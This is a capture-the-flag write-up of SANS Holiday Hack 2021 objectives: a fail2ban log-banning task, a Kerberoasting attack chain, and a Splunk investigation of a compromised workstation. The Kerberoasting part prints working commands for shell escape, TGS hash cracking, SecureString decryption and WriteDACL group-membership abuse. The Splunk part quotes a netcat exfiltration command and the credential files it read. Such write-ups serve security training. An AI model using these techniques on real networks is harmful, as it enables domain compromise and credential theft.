    What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? <br>
    Start by registering as a student on the ElfU Portal. Find Eve Snowshoes in Santa's office for hints.
    </td>
</tr>
<tr>
    <td>
    <b>Difficulty Level : </b> <br>
    <img src="images/hhc2021/difficulty_5.png" alt="drawing" width="100px"/><br>
    </td>
    <td>
     <b>Location : </b> <br>
    Santa’s Office 
    </td>
    <td>
    <b>Elf/Troll : </b> <br>
   <img src="images/hhc2021/image010.png" alt="drawing" width="30px"/> Eve Snowshoes <br>
    </td>
</tr>
</table>

<table>
<tr>
    <td>
    <img src="images/hhc2021/image082.png" alt="drawing" width="300px"/>
    </td>
    <td>
        Please note this objective was not near Eve Snowshoes but since they provided such cool hints, I wanted to keep this elf here. <br>
        <b>Hints from Eve Snowshoes : </b> (Because we solved their terminal challenge “HoHo…No”) <br>
        <ol>
        <li>There's a great talk by Chris Davis on this exact subject!</li>
        <li>There are also plenty of resources available to learn more about Kerberoasting specifically.</li>
        <li>If you have any trouble finding the domain controller on the 10.X.X.X network, remember that, when not running as root, nmap default probing relies on connecting to TCP 80 and 443.</li>
        <li>Got a hash that won't crack with your wordlist? OneRuleToRuleThemAll.rule is a great way to grow your keyspace.</li>
        <li>Where'd you get your wordlist? CeWL might generate a great wordlist from the ElfU website,but it will ignore digits in terms by default.</li>
        </ol>
        <b>Website:</b><br>
        <a href="https://register.elfu.org/register" target=_blank>https://register.elfu.org/register</a>
    </td>
<tr>
</table>


We first solve the HoHo..No terminal challenge from Eve Snowshoes.

### HoHo..No Terminal Challenge
This terminal challenge needs us to identify the malicious IP addresses in the logs and add them to the naughty list so It could be blocked using fail2ban.

Thre is an excellent talk by Mr. Andy Smith on <a href="https://www.youtube.com/watch?v=Fwv2-uV6e5I" target=_blank>Fail2ban</a> whicih immensely helped in solving this terminal challenge.
<img src="images/hhc2021/image083.png" alt="drawing" width="800px"/>

<b> First find all the patterns of log entries in the/var/log/hohono.log </b> <br>
Exclude all the successful logins or valid heartbeats and put other in ashish.log. <br>

```bash
cat /var/log/hohono.log | grep -v -e "success" -e "Valid heartbeat" > ashish.log
```

Replace all the IP addresses in ashish.log with naughty_ip 
```bash
sed -i -e 's/[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}/naughty_ip/g' ashish.log
```
Get only the messages
```bash
cat ashish.log | cut -d ' ' -f3- | sort | uniq
```

Sample Unique log entries <br>
<img src="images/hhc2021/image084.png" alt="drawing" width="800px"/>

Unique patterns of the log entries <br>

>Failed login from <host> for user<br>
>Invalid heartbeat '<user>' from <host><br>
>Login from <host> rejected due to unknown user name<br>
><host> sent a malformed request<br>

Now we can create the custom jail and then filter and actions for the custom jail. <br>

<b>Creating the custom jail</b> <br>
```bash
nano /etc/fail2ban/jail.d/my_jail.conf
```
Below would be the content of the my_jail.conf 
```json
[my_jail]
enabled = true
logpath = /var/log/hohono.log
findtime = 60m
maxretry = 10
bantime = 30m
filter = my_filter
action = my_action
```

<b>Creating the custom filter</b> <br>
```bash
nano /etc/fail2ban/filter.d/my_filter.conf
```

Below would be the content of the my_filter.conf 
```json
[Definition]
failregex = <HOST> sent a malformed request$
Failed login from <HOST>
Login from <HOST> rejected due to unknown user name$
Invalid heartbeat \S+ from <HOST>$
```

<b>Creating the custom action</b> <br>
```bash
nano /etc/fail2ban/filter.d/my_action.conf
```

Below would be the content of the my_action.conf <br>
Please note this is where we add the IP addresses we have identified to get added to the naughtly list to ban using fail2ban.
```json
[Definition]
actionban   = /root/naughtylist add <ip>
actionunban = /root/naughtylist add <ip>
```
<b>Restart the fail2ban service</b> <br>
```bash
service fail2ban restart
```

<b>Refresh the naughtylist</b> <br>
```bash
./naughtylist refresh
```

<b>Achievement unlocked :</b> <br>
<img src="images/hhc2021/image085.png" alt="drawing" width="1000px"/>

Now we go over to objective#8 Kerberoasting

### Registration and SSH to elfu.local domain
We register on https://register.elfu.org/register using a custom domain. <br>
We are provided a domain user named <b>rflkkildwi</b> and the password for it.<br>

SSH to grades.elfu.local as <b>rflkkildwi</b> : <br>
<img src="images/hhc2021/image086.png" alt="drawing" width="600px"/>

We see the below menu:<br>
<img src="images/hhc2021/image087.png" alt="drawing" width="600px"/>

We escape the SSD using Ctrl+D.<br>
Once in Python, use below to spawn an interactive bash shell.<br>

```python
import pty; pty.spawn("/bin/bash")  
```
Conduct reconnaissance : <br>
Username and Hostname : <br>
<img src="images/hhc2021/image088.png" alt="drawing" width="300px"/><br>
Local IP : <br>
<img src="images/hhc2021/image089.png" alt="drawing" width="300px"/><br>
Get the neighbours. There are 4 of them. <br>
<img src="images/hhc2021/image090.png" alt="drawing" width="600px"/>

Conduct nmap scan on top 10 ports on each of those hosts to know what services are running there. <br>
Looks like 172.17.0.4 and 172.17.0.5 are running SMB and may have shared folders. <br>

<table>
    <tr>
        <th>nmap -top-ports 10 172.17.0.4</th>
        <th>nmap -top-ports 10 172.17.0.5</th>
    <tr>
    <tr>
        <td><img src="images/hhc2021/image091.png" alt="drawing" width="600px"/></td>
        <td><img src="images/hhc2021/image092.png" alt="drawing" width="600px"/></td>
    <tr>   
</table>

We look for shared folders on 172.17.0.4 and 172.17.0.5 <br>
Looks like 172.17.0.5 has two shared folders but the user rfkkildwi does not have access on these shares<br>

<ol>
    <li>\\172.17.0.5 \elfu_svc_shr</li>
    <li>\\172.17.0.5 \research_dep</li>
</ol>

Request TGS ticket for the users in Hashcat format. 
The ticket is encrypted with account’s password so it can be brute forced offline.
<img src="images/hhc2021/image093.png" alt="drawing" width="1000px"/>


### Cracking the TGS hash for elfu.local\elfu_svc to get plaintext password
#### Downloading the OneRuleToRuleThemAll.rule
We have the TGS hash for elfu_svc form previous step. <br>
We copy the has to local kali machine as hash.txt.<br>
We will download OneRuleToRuleThemAll.rule from <a href="https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule" target=_blank>here</a>.<br>

```bash
wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule > OneRuleToRuleThemAll.rule
```

#### Generate the word list
Generate the word list using CeWL with –with-number option so it does not ignore digits. </br>
```bash
cewl --with-numbers https://register.elfu.org/register  > wordlist.txt
```

### Crack the TGS hash using Hashcat
Now we use the OneRuleToRuleThemAll.rule and wordlist.txt with Hashcat. <br>

```bash
hashcat -m 13100 -a 0 hash.txt --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 wordlist.txt
```
We have the plaintext password for elfu_svc. <br>
<b>Snow2021!</b>
<img src="images/hhc2021/image095.png" alt="drawing" width="1200px"/>

#### Enumerate the file share "elfu_svc_shr" and get hard coded creds for remote_elf in the script
```bash
smbclient \\\\172.17.0.5\\elfu_svc_shr -U=elfu_svc
```
Enter the password “Snow2021!” (Without quotes). <br>
And now we are able to enumerate all the files. <br>
<img src="images/hhc2021/image096.png" alt="drawing" width="1200px"/>

Check for any hard coded passwords. <br>
```bash
#Set the prompt Off
prompt OFF
#Download all the files
mget *
#Exit out of the smbclient
exit
#Grep for ConvertTo-SecureString in all the files since you use that on plain text creds to convert to # secure strings
grep -C 2 ConvertTo-SecureString *
```

<img src="images/hhc2021/image097.png" alt="drawing" width="1200px"/>

Looks like GetProcessInfo.ps1 has the hard coded credentials for another domain user named elfu.local\remote_elfu for a host 10.128.1.53. <br>
The credentials look encrypted though. So, we may to convert that to plain text.<br>

<img src="images/hhc2021/image098.png" alt="drawing" width="1200px"/>

#### Get the password for the elfu.local\remote_elf
Run this in the terminal PowerShell 7 <br>
```powershell
$key = (2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7)
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key $key
ConvertFrom-SecureString -SecureString $aPass -AsPlainText 
```
<img src="images/hhc2021/image099.png" alt="drawing" width="1200px"/>
We have the password for elfu.local\remote_elf: <br> 
<b>A1d655f7f5d98b10!</b>

#### Logon To Domain controller (DC01) using elfu.local\remote_elf
At this point we have the password for elfu.local\remote_elf which is <b>A1d655f7f5d98b10!</b>.<br>
But this user also does not have access to \\172.17.0.5\research_dep. <br>
So, we may need to escalate privileges of our user (rflkkildwi) and let's see if we can leverage elfu.local\remote_elf for that.<br>

Let’s login to the host 10.128.1.53 using elfu.local\remote_elf.<br>
First enter into PowerShell


```bash
pwsh
```
<img src="images/hhc2021/image099_1.png" alt="drawing" width="400px"/>

Get the PSCredential object using the secure string.<br>
```powershell
# Setting up the creds
$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
```
<img src="images/hhc2021/image100.png" alt="drawing" width="1200px"/>

Using the creds above, create a new PowerShell session on 10.128.1.53 <br>
```powershell
New-PSSession -Computer 10.128.1.53 -Credential $aCred
```
A new PowerShell session is created with id 1. <br>
<img src="images/hhc2021/image101.png" alt="drawing" width="1200px"/>

We enter the PowerShell session of 10.128.1.53 with name DC01 which looks like a domain controller when examining with Get-ADDomainController.
```powershell
Enter-PSSession -Id 1
Get-ADDomainController -Discover -domain "elfu.local" -Service "PrimaryDC","TimeService"
```
<img src="images/hhc2021/image102.png" alt="drawing" width="1200px"/>

### Privilege Escalation 
This involves escalating privileges of our user "rflkkildwi".<br>
We do this by adding this user  to "Research Department" AD group leveraging elfu.local\remote_elf.

<b>Find which AD group the user elfu.local\remote_elf has writeDACL permission.</b></br>
Tried with domain admins. This does not have writeDACL permission for remote_elf. <br>
```powershell
$ADSI = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=elfu,DC=local"
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount]) 
```
So, we numerate all the groups to see if something interesting come up. <br>

Get-ADGroup to get all AD groups : <br>
<img src="images/hhc2021/image103.png" alt="drawing" width="800px"/><br>
This “Research Department” group looks interesting : <br>
<img src="images/hhc2021/image104.png" alt="drawing" width="800px"/>

We see all the Access rules for Research Department and we can see remote_elf has writeDACL permission on that group. <br>
```powershell
$ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local" 
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
```
<img src="images/hhc2021/image105.png" alt="drawing" width="800px"/>

<b>Using remote_elf, add "GenericAll" permission for the user "rflkkildwi" to the identified AD group. </b>
```powershell
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "rflkkildwi"
$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$secOptions = $domainDirEntry.get_Options()
$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$domainDirEntry.RefreshCache()
$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```
We can verify if the GenericAll permission has been added for user "rflkkildwi" for AD group "Research Department" <br>
```powershell
$ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local" 
$ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
```
<img src="images/hhc2021/image106.png" alt="drawing" width="800px"/>

<b>Using remote_elf, add user "rflkkildwi" to the identified AD group.</b> <br>
```powershell
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "rflkkildwi"
$password = "Pvwevsviq#"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
$b=New-Object byte[] $sid.BinaryLength
$sid.GetBinaryForm($b,0)
$hexSID=[BitConverter]::ToString($b).Replace('-','')
$domainDirEntry.Add("LDAP://<SID=$hexSID>")
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```
We can verify if the user  "rflkkildwi" to the "Research Department" group. <br>
```powershell
Get-ADGroupMember -Identity 'ResearchDepartment' | Where-Object {$_.name -eq "rflkkildwi"}
```

<img src="images/hhc2021/image107.png" alt="drawing" width="1200px"/>

### Access the secret document 
At this point rflkkildwi is added to the "Research Department" group. <br>
So now we can access the document in the share '\\172.17.0.5\research_dep' using "rflkkildwi" . <br>
```powershell
smbclient '\\172.17.0.5\research_dep'
```
<img src="images/hhc2021/image108.png" alt="drawing" width="800px"/>

Also can download the PDF from the share to the grade.elfu.local.<br>
<img src="images/hhc2021/image109.png" alt="drawing" width="800px"/>

<b>Change the shell to bin/bash on the grades.elfu.org session</b><br>
Enter chsh to change your shell to /bin/bash.
```bash
chsh
```
<img src="images/hhc2021/image110.png" alt="drawing" width="800px"/>

<b>From local kali box download the document from the grades.elfu.org.</b><br>
<img src="images/hhc2021/image111.png" alt="drawing" width="1200px"/>

Open the PDF locally to see the 1st secret ingredient – <b>kindness</b> <br>
We use that as the answer for the objective and now the objective is completed.
<img src="images/hhc2021/image112.png" alt="drawing" width="1200px"/>
<img src="images/hhc2021/image113.png" alt="drawing" width="400px"/>

## 9. Splunk

<table border=1px>
<tr>
    <td colspan=3>
    <b>Challenge : </b> <br>
    Help Angel Candysalt solve the Splunk challenge in Santa's great hall. <br> 
    Fitzy Shortstack is in Santa's lobby, and he knows a few things about Splunk. What does Santa call you you complete the analysis?
    </td>
</tr>
<tr>
    <td>
    <b>Difficulty Level : </b> <br>
    <img src="images/hhc2021/difficulty_3.png" alt="drawing" width="100px"/><br>
    </td>
    <td>
     <b>Location : </b> <br>
    Great Room
    </td>
    <td>
    <b>Elf/Troll : </b> <br>
   <img src="images/hhc2021/image010.png" alt="drawing" width="30px"/> Angel Candysalt <br>
    </td>
</tr>
</table>

<table>
<tr>
    <td>
    <img src="images/hhc2021/image114.png" alt="drawing" width="200px"/>
    </td>
    <td>
        <b>Hints from Andy Candysalt </b> <br>
        Anywho, I'm back at Santa’s Splunk terminal again this year. <br>
        There's always more to learn!<br>
        Take a look and see what you can find this year.<br>
        With who-knows-what going on next door, it never hurts to have sharp SIEM skills!.<br>
        <b>Website:</b><br>
        <a href="https://hhc21.bossworkshops.io/en-US/app/SA-hhc/santadocs" target=_blank>https://hhc21.bossworkshops.io/en-US/app/SA-hhc/santadocs</a>
    </td>
<tr>
</table>

##### Task 1
Capture the commands Eddie ran most often, starting with git. <br> 
Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use.

###### Analysis

###### Splunk Query
```spl
index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine="git*" 
| stats count by CommandLine 
| sort count desc
```
<img src="images/hhc2021/image114_1.png" alt="drawing" width="1200px"/>

###### Answer 
git status

##### Task 2
Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. <br>
The correct one!

###### Analysis
Referred the below article on how to add a remote repository :
<a href="https://docs.github.com/en/get-started/getting-started-with-git/managing-remote-repositories" target=_blank> 
https://docs.github.com/en/get-started/getting-started-with-git/managing-remote-repositories
</a> <br>
The git remote add command takes two arguments:
<ul>
    <li>A remote name, for example, origin</li>
    <li>A remote URL, for example, https://github.com/user/repo.git</li>
</ul>

###### Splunk Query
```spl
index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational eddie partnerapi 
CommandLine="*git remote add*"
```
<img src="images/hhc2021/image114_2.png" alt="drawing" width="1200px"/>

###### Answer 
git remote add

##### Task 3
Eddie was running Docker on his workstation. Gather the full command line that Eddie used to bring up a the partnerapi project on his workstation.

###### Analysis
How to start and run the app on docker. <br>
```
docker compose up
```
Ref : <a href="https://docs.docker.com/compose/">Docker docs</a> <br>
"Run docker compose up and the Docker compose command starts and runs your entire app"

###### Splunk Query
```spl
index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational eddie partnerapi Computer="emcjingles-l" CommandLine="docker compose up"
```
<img src="images/hhc2021/image114_3.png" alt="drawing" width="1200px"/>

###### Answer 
docer compose up


##### Task 4
Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. <br>
Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. <br> 
Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. <br>
You will need to search outside of Splunk (try GitHub) for the original name of the repository.
###### Analysis
First we check how many Git repositories have been used <br>
```
index=main sourcetype=github_json | stats values(repository.git_url)
```
<img src="images/hhc2021/image114_4.png" alt="drawing" width="800px"/>

Above shows two github repositories. <br>
<table>
    <tr>
        <th>github.com/elfnp3/partnerapi.git</th>
        <th>github.com/elfnp3/dvws-node.git</th>
    </tr>
    <tr>
        <th><img src="images/hhc2021/image114_5.png" alt="drawing" width="500px"/></th>
        <th><img src="images/hhc2021/image114_6.png" alt="drawing" width="500px"/></th>
    </tr>
</table>

But the question is "Determine the URL of the vulnerable GitHub repository that the elves cloned for testing" <br>
If we look at the elfnp3/dvws-node, looks like its cloned from snoopysecurity/dvws-node. <br>

<img src="images/hhc2021/image114_7.png" alt="drawing" width="800px"/>

snoopysecurity/dvws-node is the "Damn Vulenerable Web Services" <br>
Therefore the answer would be https://github.com/snoopysecurity/dvws-node <br>

<img src="images/hhc2021/image114_8.png" alt="drawing" width="1200px"/>
<img src="images/hhc2021/image114_9.png" alt="drawing" width="1200px"/>

###### Answer 
https://github.com/snoopysecurity/dvws-node

##### Task 5
Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. <br> 
Determine the name of the library and record it here for our workshop documentation.
###### Analysis
https://docs.npmjs.com/cli/v8/commands/npm-install<br>
npm install <package_name> 

##### Splunk query
```
index=main eddie CommandLine="*npm install*" partnerapi
```
<img src="images/hhc2021/image114_10.png" alt="drawing" width="800px"/>

###### Answer 
holiday-utils-js

##### Task 6
Another elf started gathering a baseline of the network activity that Eddie generated. <br>
Start with their search and capture the full process_name field of anything that looks suspicious.
###### Analysis
If we look at the search provided in the task <br>
```
index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=3 user=eddie NOT dest_ip IN (127.0.0.*) NOT dest_port IN (22,53,80,443) 
| stats count by dest_ip dest_port
```
The IP address 192.30.255.113 belongs to github and It us called from the git process(usr/bin/git). <br>
But the IP 54.175.69.219 belongs to AWS.</br>
Most importantly It is being called from /usr/bin/nc.openbsd which can be used for making arbitrary TCP and UDP connections and listens. </br>
[ref : <a href="https://manpages.debian.org/stretch/netcat-penbsd/nc.openbsd.1" target=_blank> https://manpages.debian.org/stretch/netcat-penbsd/nc.openbsd.1 </a><br>
This may be a suspicious action and may be potential reverse shell.<br>
Therefore the suspicious process name would be /usr/bon/nc.openbsd.

<img src="images/hhc2021/image114_11.png" alt="drawing" width="800px"/>
<img src="images/hhc2021/image114_12.png" alt="drawing" width="800px"/>
###### Answer 
/usr/bon/nc.openbsd


##### Task 7
Uh oh. This documentation exercise just turned into an investigation.<br> 
Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. <br> One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do!<br> 
Determine the number of files that were accessed by a related process and record it here.
###### Analysis
Searching for the "/usr/bin/nc.openbsd" process  <br>
```
index=main process_name="/usr/bin/nc.openbsd"
```

We see command line nc.openbsd ran the commandline "nc -q1 54.175.69.219 16842". <br>
Which means it connects to the IP address 54.175.69.219 on port 16842.<br>
The parent process here is 6788. <br>
<img src="images/hhc2021/image114_13.png" alt="drawing" width="800px"/>

Now if we look for ParentProcessId 6788. <br>
```
index=main ParentProcessId=6788
```
We see 6 files being red via /usr/bin/cat <br>
<ol>
	<li>/home/eddie/.aws/credentials</li> 
    <li>/home/eddie/.ssh/authorized_keys</li>  
	<li>/home/eddie/.ssh/config</li>  
    <li>/home/eddie/.ssh/eddie</li>  
	<li>/home/eddie/.ssh/eddie.pub</li>  
    <li>/home/eddie/.ssh/known_hosts</li> 
</ol>


So, the answer is 6. <br>
<img src="images/hhc2021/image114_14.png" alt="drawing" width="800px"/>
<img src="images/hhc2021/image114_15.png" alt="drawing" width="800px"/>

###### Answer 
6

##### Task 8
Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address.<br> 
Determine the number of files that were accessed by a related process and record it here.
###### Analysis

```
index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational user=eddie process="*bash*" CommandLine="/bin/bash *" | table CommandLine
```

From sysmon process creation data, there is only one bash script which got executed. <br>
<img src="images/hhc2021/image114_16.png" alt="drawing" width="800px"/>

```
(index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 CommandLine="*.sh"  ParentCommandLine="/bin/sh")
OR
(index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=3 process_name="/bin/sh")
| fields ProcessId,ProcessID,ProcessGuid,CommandLine,process_current_directory,dest
| stats values(ProcessId) as ProcessId values(ProcessID) as ProcessID  values(CommandLine) as CommandLine values(process_current_directory) as process_current_directory  values(dest) as dest by ProcessGuid
```
<img src="images/hhc2021/image114_17.png" alt="drawing" width="800px"/>
<img src="images/hhc2021/image114_18.png" alt="drawing" width="800px"/>

#### Objective complete
On submitting answer to the task 8, we get the below text : <br>
Thank you for helping Santa complete this investigation! Santa says you're a <b>whiz</b> <br>
We submit <b>whiz</b> as the answer for the objective #9 and Its accepted. 

<img src="images/hhc2021/image117.png" alt="drawing" width="800px"/>
<img src="images/hhc2021/image118.png" alt="drawing" width="400px"/>


## 10. Now Hiring 
## 11. Customer Complaint Analysis
## 12. Frost Tower Website Checkup
## 13. FPGA Programming


* `mkdocs new [dir-name]` - Create a new project.
* `mkdocs serve` - Start the live-reloading docs server.
* `mkdocs build` - Build the documentation site.
* `mkdocs -h` - Print help message and exit.



    mkdocs.yml    # The configuration file.
    docs/
        index.md  # The documentation homepage.
        ...       # Other markdown pages, images and other files.
